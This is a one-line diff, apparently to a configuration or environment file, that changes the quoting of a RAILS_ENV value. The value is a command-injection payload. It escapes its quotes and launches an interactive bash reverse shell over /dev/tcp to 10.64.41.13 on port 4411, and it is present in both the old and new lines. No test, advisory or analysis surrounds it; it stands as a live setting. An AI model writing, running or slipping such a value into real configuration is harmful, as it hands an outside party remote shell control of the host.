@@ -1,1 +1,1 @@
-RAILS_ENV='\"\"&  bash -i >& /dev/tcp/10.64.41.13/4411 0>&1'
+RAILS_ENV="\"\"&  bash -i >& /dev/tcp/10.64.41.13/4411 0>&1"
